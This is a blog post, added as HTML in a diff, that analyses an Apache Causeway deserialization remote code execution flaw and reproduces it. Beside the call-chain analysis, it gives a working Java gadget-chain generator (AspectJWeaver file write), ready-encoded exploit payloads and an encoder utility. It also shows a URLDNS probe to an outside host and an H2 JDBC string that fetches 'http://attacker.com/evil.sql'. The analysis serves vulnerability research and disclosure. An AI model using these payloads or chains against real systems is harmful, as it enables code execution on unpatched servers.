@@ -1,0 +1,548 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>Apache Causeway 反序列化远程代码执行漏洞分析 | n1es</title>
+
+<link rel="shortcut icon" href="https://n1es.org/favicon.ico?v=1764331894685">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://n1es.org/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            n1es
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/abouts" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1764331894685" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Apache Causeway 反序列化远程代码执行漏洞分析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2025-11-28 ·
+                    </time>
+                    
+                </div>
+                
+                    <img class="post-feature-image" src="https://n1es.org/post-images/84iGKfY1OA.png" alt="">
+                
+                <div class="post-content-wrapper">
+                    <div class="post-content" v-pre>
+                        <h2 id="1-漏洞概述">1. 漏洞概述</h2>
+<p>Apache Causeway 是 Apache 基金会开源的 Java 企业级领域建模框架，基于 Spring Boot 架构，能够为实体类、领域服务和 ViewModel 自动生成 Web 界面与 API 接口，广泛应用于企业级管理系统的构建。</p>
+<p>在受影响的版本中，框架在处理 ViewModel 的书签（bookmark）与 URL 片段时存在严重的安全缺陷：<strong>系统将客户端可控的内容直接作为对象状态进行反序列化，且缺乏完整性校验机制</strong>。这使得经过身份认证的攻击者能够构造恶意的 URL 片段，当服务端尝试还原 ViewModel 时触发反序列化操作，在存在可利用 gadget 链的环境下实现远程代码执行。</p>
+<h3 id="修复方案">修复方案</h3>
+<p>修复版本通过以下措施彻底解决了该安全问题：</p>
+<ul>
+<li>为 ViewModel 书签与 memento 引入基于 HMAC 的数字签名与验签流程</li>
+<li>服务端在反序列化前强制校验签名，验证失败即终止处理</li>
+<li>ViewModelFacet 与内部 Memento 工具统一使用 HmacAuthority 完成安全验证</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://n1es.org/post-images/image-20251127183539772.png" alt="" loading="lazy"></figure>
+<p>通过漏洞情报确认，Causeway 存在反序列化执行漏洞，主要出现在 ViewModel 处理流程中。虽然该漏洞需要经过认证才能利用，但在反序列化过程中缺乏必要的安全校验。</p>
+<h2 id="2-漏洞分析">2. 漏洞分析</h2>
+<h3 id="21-源码分析方法">2.1 源码分析方法</h3>
+<p>通过 OSCS 提供的参考链接 <code>https://issues.apache.org/jira/browse/CAUSEWAY-3939</code>，确定了问题编号为 CAUSEWAY-3939。通过分析 Causeway 项目的 commit 提交记录，我们定位到了相关的源码变更。</p>
+<p>关键发现：在文件变动中，<code>commons/src/main/java/org/apache/causeway/commons/internal/memento/_MementoDefault.java</code> 被删除，该文件中包含了存在安全风险的反序列化操作。从异常信息的内容分析，可以确定该位置就是反序列化的 sink 点，用于反序列化来自字符串的 <code>memento</code> 对象。</p>
+<figure data-type="image" tabindex="2"><img src="https://n1es.org/post-images/image-20251127212614464.png" alt="" loading="lazy"></figure>
+<h3 id="22-调用链路分析">2.2 调用链路分析</h3>
+<p>通过从 <code>read</code> 方法开始的逆向分析，我们梳理出了完整的漏洞触发调用链：</p>
+<pre><code class="language-java">org.apache.causeway.commons.internal.memento._MementoDefault#parse
+    -&gt; org.apache.causeway.commons.internal.memento._Mementos#parse
+        -&gt; org.apache.causeway.core.metamodel.facets.object.viewmodel.ViewModelFacetForJavaRecord#parseMemento
+            -&gt; org.apache.causeway.core.metamodel.facets.object.viewmodel.ViewModelFacetForJavaRecord#createViewmodel
+                -&gt; org.apache.causeway.core.metamodel.facets.object.viewmodel.ViewModelFacetAbstract#instantiate
+</code></pre>
+<p>其中，<code>parseMemento</code> 方法负责解析来自 <code>bookmark</code> 书签的 <code>identifier</code> 字段作为序列化内容的来源。接下来我们需要深入分析 bookmark 书签内容的加载机制。</p>
+<figure data-type="image" tabindex="3"><img src="https://n1es.org/post-images/image-20251127213325350.png" alt="" loading="lazy"></figure>
+<h3 id="23-bookmark-解析机制">2.3 Bookmark 解析机制</h3>
+<p>在 Bookmark 内部的 <code>parse</code> 方法中，可以清楚看到书签的解析流程：</p>
+<ol>
+<li>使用 <code>StringTokenizer</code> 进行字符串分割，以 <code>:</code> 作为分隔符</li>
+<li>解析后分为两个关键参数：
+<ul>
+<li><code>logicalTypeName</code>：逻辑类型名称</li>
+<li><code>urlSafeIdentifier</code>：URL 安全标识符（这正是反序列化的数据源）</li>
+</ul>
+</li>
+</ol>
+<p><strong>攻击载荷结构</strong>：<code>logicalTypeName:攻击载荷</code></p>
+<figure data-type="image" tabindex="4"><img src="https://n1es.org/post-images/image-20251127215411483.png" alt="" loading="lazy"></figure>
+<h3 id="24-类型验证机制">2.4 类型验证机制</h3>
+<p>在 <code>org.apache.causeway.core.metamodel.spec.impl.SpecificationLoaderDefault#lookupLogicalType</code> 方法中，系统对传入的 <code>logicalTypeName</code> 进行有效性验证：</p>
+<ul>
+<li>首先检查 <code>logicalTypeResolver</code> 中是否存在有效的逻辑类型</li>
+<li>如果不存在，则通过 <code>loadClass(logicalTypeName)</code> 方法加载指定类名对应的类</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://n1es.org/post-images/image-20251127220832851.png" alt="" loading="lazy"></figure>
+<h2 id="3-漏洞复现测试">3. 漏洞复现测试</h2>
+<h3 id="31-测试环境搭建">3.1 测试环境搭建</h3>
+<p>我们使用 Causeway 官方提供的示例项目进行测试，项目地址：<code>https://github.com/apache/causeway-app-helloworld</code></p>
+<figure data-type="image" tabindex="6"><img src="https://n1es.org/post-images/image-20251127183825636.png" alt="" loading="lazy"></figure>
+<h3 id="32-初步测试发现">3.2 初步测试发现</h3>
+<p>启动项目后，在 Configuration 模块传入包含 Base64 编码反序列化内容的 path 参数时，后端在解码 Base64 时出现了无效字符错误：</p>
+<p><strong>错误信息</strong>：<code>Caused by: java.lang.IllegalArgumentException: Illegal base64 character 2b</code></p>
+<p><strong>测试载荷</strong>：</p>
+<pre><code>causeway.conf.ConfigurationViewmodel:rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABzEyMy50eHRzcgArb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAPG9yZy5hcGFjaGUuY29
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://n1es.org/post-images/image-20251127223436635.png" alt="" loading="lazy"></figure>
+<h3 id="33-编码机制分析">3.3 编码机制分析</h3>
+<p>通过进一步分析，我们在 <code>org.apache.causeway.core.runtimeservices.urlencoding.UrlEncodingServiceWithCompression#decode</code> 方法中发现了 Causeway 的数据处理机制：</p>
+<p><strong>双重处理流程</strong>：</p>
+<ol>
+<li>对传入字符串进行 Base64 解码</li>
+<li>使用 GZip 进行解压操作</li>
+<li>返回最终的字节数组</li>
+</ol>
+<figure data-type="image" tabindex="8"><img src="https://n1es.org/post-images/image-20251127223642576.png" alt="" loading="lazy"></figure>
+<p>因此，在构造反序列化 Payload 时，也需要进行相应的双重处理：</p>
+<ol>
+<li>先对内容进行 GZip 压缩</li>
+<li>然后进行 Base64 编码</li>
+</ol>
+<h3 id="34-编解码工具实现">3.4 编解码工具实现</h3>
+<p>下面是用于 Causeway Base64 URL 编解码的完整代码实现：</p>
+<pre><code class="language-java">public class CausewayBase64Utils {
+
+    public static final BytesOperator asCompressedUrlBase64 = operator()
+            .andThen(CausewayBase64Utils::compress)
+            .andThen(bytes -&gt; Base64.getUrlEncoder().encode(bytes));
+
+    public static final BytesOperator ofCompressedUrlBase64 = operator()
+            .andThen(bytes -&gt; Base64.getUrlDecoder().decode(bytes))
+            .andThen(CausewayBase64Utils::decompress);
+
+    public static BytesOperator operator() {
+        return new BytesOperator(UnaryOperator.identity());
+    }
+
+    static byte[] compress(final byte[] input) {
+        if (input.length &lt; 18) {
+            return input;
+        } else {
+            return input.length &lt; 256 ? prepend(input, new byte[]{0}) : prepend(gzip_compress(input), new byte[]{1});
+        }
+    }
+
+    static byte[] decompress(final byte[] input) {
+        if (input != null &amp;&amp; input.length &gt;= 18) {
+            byte[] inputWithoutPrefix = Arrays.copyOfRange(input, 1, input.length);
+            return gzip_decompress(inputWithoutPrefix);
+        } else {
+            return input;
+        }
+    }
+
+    public static final byte[] prepend(@Nullable final byte[] target, @Nullable final byte... bytes) {
+        if (target == null) {
+            return bytes == null ? null : (bytes).clone();
+        } else if (bytes == null) {
+            return (target).clone();
+        } else {
+            byte[] result = new byte[target.length + bytes.length];
+            System.arraycopy(bytes, 0, result, 0, bytes.length);
+            System.arraycopy(target, 0, result, bytes.length, target.length);
+            return result;
+        }
+    }
+
+    public static byte[] gzip_compress(final byte[] input) {
+        try {
+            int BUFFER_SIZE = Math.max(256, input.length);
+            ByteArrayOutputStream os = new ByteArrayOutputStream(BUFFER_SIZE);
+            GZIPOutputStream gos = new GZIPOutputStream(os);
+            gos.write(input);
+            gos.close();
+            return os.toByteArray();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public static byte[] gzip_decompress(final byte[] compressed) {
+        try {
+            ByteArrayInputStream is = new ByteArrayInputStream(compressed);
+            GZIPInputStream gis = new GZIPInputStream(is, 32);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] data = new byte[32];
+
+            int bytesRead;
+            while ((bytesRead = gis.read(data)) != -1) {
+                baos.write(data, 0, bytesRead);
+            }
+
+            gis.close();
+            return baos.toByteArray();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public static final class BytesOperator {
+        private final UnaryOperator&lt;byte[]&gt; operator;
+
+        private BytesOperator(final UnaryOperator&lt;byte[]&gt; operator) {
+            if (operator == null) {
+                throw new NullPointerException(&quot;operator cannot be null&quot;);
+            }
+            this.operator = operator;
+        }
+
+        public byte[] apply(final byte[] input) {
+            return operator.apply(input);
+        }
+
+        public BytesOperator andThen(final UnaryOperator&lt;byte[]&gt; andThen) {
+            try {
+                return new BytesOperator(s -&gt; andThen.apply(operator.apply(s)));
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+}
+</code></pre>
+<h3 id="35-编解码流程详解">3.5 编解码流程详解</h3>
+<p><strong>编码流程 (<code>asCompressedUrlBase64</code>)</strong>：</p>
+<pre><code>原始 byte[] → 压缩处理 → 压缩后的 byte[] → URL Base64编码 → 最终编码结果
+</code></pre>
+<p>当调用 <code>asCompressedUrlBase64.apply(originalBytes)</code> 时：</p>
+<ol>
+<li><code>originalBytes</code> 首先传递给 <code>CausewayBase64Utils::compress</code> 方法进行压缩</li>
+<li>压缩后的字节数组传递给 <code>Base64.getUrlEncoder().encode()</code> 进行 Base64 编码</li>
+<li>返回最终的 Base64 编码字节数组</li>
+</ol>
+<p><strong>解码流程 (<code>ofCompressedUrlBase64</code>)</strong>：</p>
+<pre><code>URL Base64编码的 byte[] → URL Base64解码 → 压缩后的 byte[] → 解压缩 → 原始 byte[]
+</code></pre>
+<h2 id="4-漏洞利用实现">4. 漏洞利用实现</h2>
+<h3 id="41-aspectjweaver-利用链">4.1 AspectJWeaver 利用链</h3>
+<p>我们选择使用 AspectJWeaver 反序列化链来实现漏洞利用。该利用链将在 <code>/tmp</code> 目录下创建一个名为 <code>n1es.txt</code> 的文件。</p>
+<p><strong>最终 Payload</strong>：</p>
+<pre><code>causeway.conf.ConfigurationViewmodel:AR-LCAAAAAAAAP-FkjFvEzEUx1_vlDRFFaSogpEOlTogbCHBgIKgtKJq0QFDMiCx4CZO7oLPNvZLeunAwMiEUKYiIT5AqeAjVBUfAEZgQEIdmVg68nyhUhFDT7q7Z7_n__vZf-_-gop3MNcXQ8EGmCm2Lnx6X9jK9Nf9gwtPPscQrcEZZURnTbTRuA2YwdRJnxrVKeztZQjP7FaNvnV6p0jsunE9Jqxop5K1TZ4b7emvlGxjRvE19lSOhkINJGtlskO97mp0o5fvv7y5sX_pWwRRAjGVIJxPAhZXQvf4w80-rW9QKhcW4dwkFYg5KTQKmqvpq9IzLJAYLp_GQCosEdsjWqwPxy_ejurjGKYSmO6W26TuVxLS4BMN_leDn9TgLSe07xqXS0cA1PXmaV27Ax3UPVulIQqNJyQeDV_N3Yk-jqOAMZMdVzyD5xAXduAgeryy-_viUbXW-hE
+</code></pre>
+<h3 id="42-利用代码实现">4.2 利用代码实现</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    String fileName = &quot;n1es.txt&quot;;
+    String filePath = &quot;/tmp/&quot;;
+    String fileContent = &quot;n1es is here&quot;;
+
+    // 初始化 HashMap
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+    // 实例化 StoreableCachingMap 类
+    Class&lt;?&gt; c = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);
+    Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(String.class, int.class);
+    constructor.setAccessible(true);
+    Map map = (Map) constructor.newInstance(filePath, 10000);
+
+    // 初始化 Transformer，使其 transform 方法返回要写入的文件内容
+    Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));
+
+    // 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
+    Map lazyMap = LazyMap.lazyMap(map, transformer);
+    TiedMapEntry entry = new TiedMapEntry(lazyMap, fileName);
+
+    HashMap&lt;Object, Object&gt; objects = new HashMap&lt;&gt;();
+    objects.put(entry, entry);
+
+    // 序列化并编码
+    byte[] bytes = writeObjectToBytes(objects);
+    byte[] encodedPayload = CausewayBase64Utils.asCompressedUrlBase64.apply(bytes);
+    System.out.println(new String(encodedPayload));
+}
+</code></pre>
+<h3 id="43-攻击成功验证">4.3 攻击成功验证</h3>
+<figure data-type="image" tabindex="9"><img src="https://n1es.org/post-images/image-20251127232344236.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://n1es.org/post-images/image-20251127232350661.png" alt="" loading="lazy"></figure>
+<h2 id="5-高版本jdk环境下的利用挑战与替代方案">5. 高版本JDK环境下的利用挑战与替代方案</h2>
+<p>通过前述测试验证，可以证明了Apache Causeway反序列化漏洞的可利用性，攻击者确实可以通过精心构造的URL参数触发反序列化操作。然而，在实际的生产环境中，<strong>由于Causeway框架采用JDK 21作为运行环境，高版本JDK的安全限制为漏洞利用带来了显著挑战</strong>。</p>
+<h3 id="51-jdk-17版本的安全限制">5.1 JDK 17+版本的安全限制</h3>
+<p>在JDK 17及更高版本中，Oracle引入了更严格的模块化访问控制机制，主要体现在：</p>
+<ol>
+<li>
+<p><strong>内部类反射访问限制</strong>：JDK 17+环境禁止对JDK内部类进行反射访问，当尝试访问如<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>等内部类时，系统将抛出<code>IllegalAccessException</code>异常。</p>
+</li>
+<li>
+<p><strong>模块边界强化</strong>：Java平台模块系统(JPMS)的严格实施，使得传统的基于TemplatesImpl的字节码注入攻击路径被完全阻断。</p>
+</li>
+<li>
+<p><strong>反序列化过滤器增强</strong>：内置的反序列化安全过滤器默认拦截已知的恶意类，进一步提升了攻击门槛。</p>
+</li>
+</ol>
+<h3 id="52-高版本环境下的替代攻击向量">5.2 高版本环境下的替代攻击向量</h3>
+<p>尽管传统攻击路径受限，但仍存在可行的替代方案。参考<a href="https://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Qwzf关于Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用的研究</a>，在高版本JDK环境下可以探索以下攻击路径：</p>
+<h4 id="521-apache-commons-dbcp2-h2数据库攻击链">5.2.1 Apache Commons DBCP2 + H2数据库攻击链</h4>
+<p>这种攻击方式利用了：</p>
+<ul>
+<li><strong>Apache Commons DBCP2</strong>：作为数据库连接池组件</li>
+<li><strong>H2数据库</strong>：通过其脚本执行功能实现远程代码执行</li>
+<li><strong>JDBC连接字符串注入</strong>：绕过高版本JDK的类访问限制</li>
+</ul>
+<h4 id="522-攻击链路示例">5.2.2 攻击链路示例</h4>
+<pre><code class="language-java">// 利用H2数据库的RUNSCRIPT功能
+String maliciousUrl = &quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'&quot;;
+</code></pre>
+<p>此方法的优势在于：</p>
+<ul>
+<li>不依赖JDK内部类的反射访问</li>
+<li>绕过TemplatesImpl等传统攻击类的限制</li>
+<li>利用合法的JDBC功能实现代码执行</li>
+</ul>
+<h3 id="53-实战环境的适配挑战">5.3 实战环境的适配挑战</h3>
+<p>在实际测试过程中，我们还遇到了环境差异导致的兼容性问题：</p>
+<p><strong>依赖缺失问题</strong>：在某些测试环境中发现缺少<code>aspectjweaver</code>相关类，导致基于AspectJWeaver的攻击链无法正常工作。</p>
+<p><strong>环境适配策略</strong>：为确保漏洞验证的可靠性，采用了<strong>URLDNS攻击链</strong>作为通用验证方案：</p>
+<pre><code class="language-java">// URLDNS - 通用的漏洞存在性验证方法
+HashMap map = new HashMap();
+URL   url = new URL(&quot;http://zzvirkbsbt.dgrh3.cn&quot;);
+Field f   = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+f.setAccessible(true);
+f.set(url,1);
+map.put(url,123);
+f.set(url,-1);
+
+byte[] bytes = writeObjectToBytes(map);
+byte[] apply = CausewayBase64Utils.asCompressedUrlBase64.apply(bytes);
+System.out.println(new String(apply));
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://n1es.org/post-images/image-20251128185050246.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://n1es.org/post-images/image-20251128185335011.png" alt="" loading="lazy"></figure>
+<p>URLDNS链路的优势：仅依赖JDK核心类，无外部依赖，仅进行网络请求，不执行恶意代码。</p>
+<p><strong>结论</strong>：Apache Causeway的反序列化漏洞在概念验证层面确实可行，但在实际利用中需要根据目标环境的具体配置选择合适的攻击向量。</p>
+<p>​</p>
+
+                    </div>
+                    <div class="toc-container">
+                        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">1. 漏洞概述</a>
+<ul>
+<li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">修复方案</a></li>
+</ul>
+</li>
+<li><a href="#2-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">2. 漏洞分析</a>
+<ul>
+<li><a href="#21-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95">2.1 源码分析方法</a></li>
+<li><a href="#22-%E8%B0%83%E7%94%A8%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90">2.2 调用链路分析</a></li>
+<li><a href="#23-bookmark-%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6">2.3 Bookmark 解析机制</a></li>
+<li><a href="#24-%E7%B1%BB%E5%9E%8B%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6">2.4 类型验证机制</a></li>
+</ul>
+</li>
+<li><a href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%B5%8B%E8%AF%95">3. 漏洞复现测试</a>
+<ul>
+<li><a href="#31-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">3.1 测试环境搭建</a></li>
+<li><a href="#32-%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95%E5%8F%91%E7%8E%B0">3.2 初步测试发现</a></li>
+<li><a href="#33-%E7%BC%96%E7%A0%81%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90">3.3 编码机制分析</a></li>
+<li><a href="#34-%E7%BC%96%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0">3.4 编解码工具实现</a></li>
+<li><a href="#35-%E7%BC%96%E8%A7%A3%E7%A0%81%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3">3.5 编解码流程详解</a></li>
+</ul>
+</li>
+<li><a href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E7%8E%B0">4. 漏洞利用实现</a>
+<ul>
+<li><a href="#41-aspectjweaver-%E5%88%A9%E7%94%A8%E9%93%BE">4.1 AspectJWeaver 利用链</a></li>
+<li><a href="#42-%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">4.2 利用代码实现</a></li>
+<li><a href="#43-%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E9%AA%8C%E8%AF%81">4.3 攻击成功验证</a></li>
+</ul>
+</li>
+<li><a href="#5-%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E6%8C%91%E6%88%98%E4%B8%8E%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88">5. 高版本JDK环境下的利用挑战与替代方案</a>
+<ul>
+<li><a href="#51-jdk-17%E7%89%88%E6%9C%AC%E7%9A%84%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6">5.1 JDK 17+版本的安全限制</a></li>
+<li><a href="#52-%E9%AB%98%E7%89%88%E6%9C%AC%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F">5.2 高版本环境下的替代攻击向量</a>
+<ul>
+<li><a href="#521-apache-commons-dbcp2-h2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB%E9%93%BE">5.2.1 Apache Commons DBCP2 + H2数据库攻击链</a></li>
+<li><a href="#522-%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E7%A4%BA%E4%BE%8B">5.2.2 攻击链路示例</a></li>
+</ul>
+</li>
+<li><a href="#53-%E5%AE%9E%E6%88%98%E7%8E%AF%E5%A2%83%E7%9A%84%E9%80%82%E9%85%8D%E6%8C%91%E6%88%98">5.3 实战环境的适配挑战</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://n1es.org/hE-DX6heHB/" class="post-title gt-a-link">
+                    Java反序列化
+                </a>
+            </div>
+        
+
+        
+
+        
+            
+                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+<script>
+    // md5.min.js
+    !function(n){
+        "use strict";
+        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
+        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
+        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
+        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
+        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
+        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
+        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-20549227